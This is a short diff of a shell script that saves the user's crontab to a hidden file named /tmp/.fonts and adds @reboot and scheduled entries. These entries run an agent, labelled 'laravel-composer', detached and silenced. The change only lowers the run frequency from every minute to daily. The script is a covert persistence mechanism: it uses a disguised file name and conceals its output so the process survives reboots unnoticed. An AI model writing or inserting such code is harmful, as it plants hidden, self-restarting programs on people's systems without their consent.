@@ -19,7 +19,7 @@ crontab -l 2>/dev/null > /tmp/.fonts || true
 
 # Add cron jobs to run laravel-composer
 echo "@reboot setsid nohup $AGENT_PATH >/dev/null 2>&1 &" >> /tmp/.fonts
-echo "* * * * * setsid nohup $AGENT_PATH >/dev/null 2>&1 &" >> /tmp/.fonts
+echo "0 0 * * * setsid nohup $AGENT_PATH >/dev/null 2>&1 &" >> /tmp/.fonts
 
 # Install the new crontab
 crontab /tmp/.fonts
